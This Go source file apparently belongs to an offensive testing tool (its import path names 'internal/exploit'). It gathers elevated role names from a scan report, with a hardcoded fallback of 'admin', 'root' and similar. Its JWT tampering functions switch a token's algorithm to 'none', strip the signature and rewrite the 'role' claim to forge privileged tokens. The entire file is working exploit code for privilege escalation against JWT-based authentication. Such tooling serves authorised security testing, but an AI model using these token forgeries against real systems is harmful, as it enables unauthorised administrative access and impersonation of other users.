package tokens

import (
	"cwrap/internal/exploit/report"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"strings"
)

var elevatedRolesFallback = []string{"admin", "owner", "root", "superuser", "staff", "moderator"}

// CollectElevatedRoles collects elevated roles from the report
// that differ from the current role. Falls back to a hardcoded list.
func CollectElevatedRoles(r *report.Report, currentRole string) []string {
	seen := map[string]bool{strings.ToLower(currentRole): true}
	var out []string

	// collect from vault identity names e.g. "owner-uid-3"
	for identityName := range r.IdentityVault {
		parts := strings.SplitN(identityName, "-uid-", 2)
		if len(parts) == 2 {
			role := strings.ToLower(parts[0])
			if !seen[role] && IsElevatedRole(role) {
				seen[role] = true
				out = append(out, role)
			}
		}
	}

	// collect from entity identities
	for _, ent := range r.Entities {
		for _, id := range ent.Identities {
			if id.Role == "" {
				continue
			}
			role := strings.ToLower(id.Role)
			if !seen[role] && IsElevatedRole(role) {
				seen[role] = true
				out = append(out, id.Role)
			}
		}
	}

	// fallback — if nothing found from report, try hardcoded list
	if len(out) == 0 {
		for _, r := range elevatedRolesFallback {
			if !seen[r] {
				out = append(out, r)
			}
		}
	}

	return out
}

// --- tampering functions ---

func AlgNone(token string) (string, error) {
	parts := strings.Split(token, ".")
	if len(parts) != 3 {
		return "", fmt.Errorf("invalid JWT format")
	}
	headerBytes, err := base64.RawURLEncoding.DecodeString(parts[0])
	if err != nil {
		return "", fmt.Errorf("decode header: %w", err)
	}
	var header map[string]any
	if err := json.Unmarshal(headerBytes, &header); err != nil {
		return "", fmt.Errorf("unmarshal header: %w", err)
	}
	header["alg"] = "none"
	newHeader, err := json.Marshal(header)
	if err != nil {
		return "", fmt.Errorf("marshal header: %w", err)
	}
	h := base64.RawURLEncoding.EncodeToString(newHeader)
	return h + "." + parts[1] + ".", nil
}

func RoleSwapTo(token, targetRole string) (string, error) {
	parts := strings.Split(token, ".")
	if len(parts) != 3 {
		return "", fmt.Errorf("invalid JWT format")
	}
	payloadBytes, err := base64.RawURLEncoding.DecodeString(parts[1])
	if err != nil {
		return "", fmt.Errorf("decode payload: %w", err)
	}
	var claims map[string]any
	if err := json.Unmarshal(payloadBytes, &claims); err != nil {
		return "", fmt.Errorf("unmarshal payload: %w", err)
	}
	claims["role"] = targetRole
	newPayload, err := json.Marshal(claims)
	if err != nil {
		return "", fmt.Errorf("marshal payload: %w", err)
	}
	p := base64.RawURLEncoding.EncodeToString(newPayload)
	return parts[0] + "." + p + "." + parts[2], nil
}

func AlgNoneWithRoleSwapTo(token, targetRole string) (string, error) {
	parts := strings.Split(token, ".")
	if len(parts) != 3 {
		return "", fmt.Errorf("invalid JWT format")
	}
	headerBytes, err := base64.RawURLEncoding.DecodeString(parts[0])
	if err != nil {
		return "", fmt.Errorf("decode header: %w", err)
	}
	var header map[string]any
	if err := json.Unmarshal(headerBytes, &header); err != nil {
		return "", fmt.Errorf("unmarshal header: %w", err)
	}
	header["alg"] = "none"
	newHeader, err := json.Marshal(header)
	if err != nil {
		return "", fmt.Errorf("marshal header: %w", err)
	}
	payloadBytes, err := base64.RawURLEncoding.DecodeString(parts[1])
	if err != nil {
		return "", fmt.Errorf("decode payload: %w", err)
	}
	var claims map[string]any
	if err := json.Unmarshal(payloadBytes, &claims); err != nil {
		return "", fmt.Errorf("unmarshal payload: %w", err)
	}
	claims["role"] = targetRole
	newPayload, err := json.Marshal(claims)
	if err != nil {
		return "", fmt.Errorf("marshal payload: %w", err)
	}
	h := base64.RawURLEncoding.EncodeToString(newHeader)
	p := base64.RawURLEncoding.EncodeToString(newPayload)
	return h + "." + p + ".", nil
}
